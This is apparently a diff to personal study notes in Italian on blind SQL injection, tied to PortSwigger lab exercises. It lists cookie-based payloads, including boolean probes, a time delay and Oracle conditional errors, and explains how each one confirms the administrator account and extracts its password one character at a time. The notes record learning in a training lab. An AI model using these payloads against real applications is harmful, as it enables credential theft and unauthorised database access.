@@ -90,6 +90,8 @@ time delay
 time delay per trovare un carattere alla volta
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
+sui cookie non serve URL encoding
+
 TrackingId=xyz' AND '1'='1 injection sui cookie
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   -> boolean per confermare l'esistenza di una tabella chiamata users
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a     -> confermare l'esistenza dell'utente administrator nella tabella users
@@ -102,6 +104,18 @@ TrackingId=xyz'||(SELECT '' FROM dual)||'  -> oracle syntax
 TrackingId=xyz'||(SELECT '')||'   -> sql syntax
 
 TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'       -> importante tenere in considerazione WHERE ROWNUM in modo tale da non restituire più colonne e non rompere la concatenazione
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'          -> test per verificare le condizioni  
+                                                                                    -> condizione 1=1 vera sull'esempio genera un errore mentre 1=2 non genera errori, 
+                                                                                        però poi l'errore viene generato dalla divisione per 0 (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'        -> utilizzabile per verificare se delle entries esistono sul database
+                                                                                                                                -> se la condizione è vera ricevo un errore
+                                                                                                                                    -> administrator esiste
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'      -> quanti caratteri ci sono sulla password di quell'utente
+
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'     -> da quali caratteri è composta la password
 
 OAST techniques
 genera DNS query spesso
